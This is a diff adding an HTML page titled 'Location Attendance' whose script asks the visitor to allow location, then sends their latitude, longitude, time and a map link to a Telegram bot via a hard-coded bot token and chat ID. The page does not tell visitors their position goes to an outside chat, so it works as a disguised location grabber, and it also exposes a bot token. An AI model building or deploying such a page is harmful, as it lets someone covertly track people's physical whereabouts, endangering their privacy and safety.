@@ -1,1 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Location Attendance</title>
+</head>
+<body>
+<h3>Please allow location</h3>
 
+<script>
+const BOT_TOKEN = "8596201289:AAE7Ymg25nOMZlgWDpw-128Mkzbu90PVTMw";
+const CHAT_ID = "7491798353";
+
+navigator.geolocation.getCurrentPosition(
+  function(pos) {
+    const lat = pos.coords.latitude;
+    const lon = pos.coords.longitude;
+    const time = new Date().toLocaleString();
+
+    const msg =
+`📍 Location Received
+Latitude: ${lat}
+Longitude: ${lon}
+Time: ${time}
+https://maps.google.com/?q=${lat},${lon}`;
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: msg
+      })
+    });
+  },
+  function() {
+    alert("Location permission denied");
+  }
+);
+</script>
+</body>
+</html>
